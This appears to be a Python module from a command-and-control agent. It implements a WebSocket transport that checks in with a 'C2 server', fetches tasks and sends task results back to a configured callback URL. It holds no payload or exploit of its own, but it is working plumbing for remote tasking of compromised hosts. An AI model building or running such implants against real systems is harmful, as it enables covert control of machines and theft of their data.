"""
WebSocket transport for agent communications
"""

import json
import time
import asyncio
from typing import Dict, Any, List, Optional

try:
    import websockets
except ImportError:
    websockets = None

class WebSocketTransport:
    """WebSocket transport implementation for real-time communications"""
    
    def __init__(self, config):
        if websockets is None:
            raise ImportError("websockets library not available")
            
        self.config = config
        self.websocket = None
        self.connected = False
        
        # Convert HTTP URL to WebSocket URL
        ws_url = config.callback_url.replace('http://', 'ws://').replace('https://', 'wss://')
        self.ws_url = f"{ws_url}/ws/agent/{config.session_id}"
    
    async def connect(self):
        """Connect to WebSocket server"""
        try:
            self.websocket = await websockets.connect(self.ws_url)
            self.connected = True
            return True
        except Exception as e:
            print(f"WebSocket connection error: {e}")
            self.connected = False
            return False
    
    async def disconnect(self):
        """Disconnect from WebSocket server"""
        if self.websocket:
            await self.websocket.close()
            self.connected = False
    
    async def checkin(self, agent_data: Dict[str, Any]) -> Dict[str, Any]:
        """Check in with C2 server via WebSocket"""
        if not self.connected:
            if not await self.connect():
                return {}
        
        try:
            message = {
                'type': 'checkin',
                'data': agent_data
            }
            
            await self.websocket.send(json.dumps(message))
            
            # Wait for response
            response = await asyncio.wait_for(
                self.websocket.recv(), 
                timeout=self.config.timeout
            )
            
            return json.loads(response)
            
        except Exception as e:
            print(f"WebSocket checkin error: {e}")
            self.connected = False
            return {}
    
    async def get_tasks(self) -> List[Dict[str, Any]]:
        """Get pending tasks via WebSocket"""
        if not self.connected:
            if not await self.connect():
                return []
        
        try:
            message = {
                'type': 'get_tasks',
                'session_id': self.config.session_id
            }
            
            await self.websocket.send(json.dumps(message))
            response = await asyncio.wait_for(
                self.websocket.recv(), 
                timeout=self.config.timeout
            )
            
            data = json.loads(response)
            return data.get('tasks', [])
            
        except Exception as e:
            print(f"WebSocket get_tasks error: {e}")
            return []
    
    async def send_result(self, result_data: Dict[str, Any]) -> bool:
        """Send task result via WebSocket"""
        if not self.connected:
            if not await self.connect():
                return False
        
        try:
            message = {
                'type': 'task_result',
                'data': result_data
            }
            
            await self.websocket.send(json.dumps(message))
            return True
            
        except Exception as e:
            print(f"WebSocket send_result error: {e}")
            return False
    
    # Synchronous wrappers for compatibility
    def checkin_sync(self, agent_data: Dict[str, Any]) -> Dict[str, Any]:
        """Synchronous wrapper for checkin"""
        return asyncio.run(self.checkin(agent_data))
    
    def get_tasks_sync(self) -> List[Dict[str, Any]]:
        """Synchronous wrapper for get_tasks"""
        return asyncio.run(self.get_tasks())
    
    def send_result_sync(self, result_data: Dict[str, Any]) -> bool:
        """Synchronous wrapper for send_result"""
        return asyncio.run(self.send_result(result_data))